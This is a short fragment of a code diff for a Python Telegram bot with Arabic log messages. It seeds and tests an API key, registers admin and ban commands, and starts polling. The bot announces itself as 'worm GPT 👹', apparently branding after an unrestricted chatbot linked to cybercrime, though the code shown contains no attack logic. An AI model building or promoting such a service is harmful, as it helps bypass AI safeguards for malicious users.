+        await db.add_api_key(INITIAL_API_KEY, INITIAL_API_KEY_LABEL, SUPER_ADMIN_ID)
+        keys = await db.list_api_keys()
+        if keys:
+            await db.set_active_key(keys[0]["id"])
+            logger.info("✅ أُضيف المفتاح الأولي")
+    active = await db.get_active_key()
+    if active:
+        ok, msg = await api.test_key(active["key_value"])
+        logger.info(f"🔑 {msg}")
+    logger.info("✅ worm GPT 👹 جاهز!")
+
+def main():
+    if "ضع_التوكن" in BOT_TOKEN:
+        print("❌ ضع BOT_TOKEN"); return
+
+    app = Application.builder().token(BOT_TOKEN).post_init(post_init).build()
+
+    app.add_handler(CommandHandler("start", start))
+    app.add_handler(CommandHandler("admin", admin_cmd))
+    app.add_handler(CommandHandler("ban", ban_cmd))
+    app.add_handler(CommandHandler("unban", unban_cmd))
+    app.add_handler(CommandHandler("cancel", cancel_cmd))
+    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_router))
+
+    logger.info("🚀 بدء التشغيل...")
+    app.run_polling(allowed_updates=Update.ALL_TYPES)
 
 if __name__ == "__main__":
-    try:
-        setup()
-    except KeyboardInterrupt:
-        print("\n⚠️ تم الإيقاف")
-        sys.exit(0)
+    main()
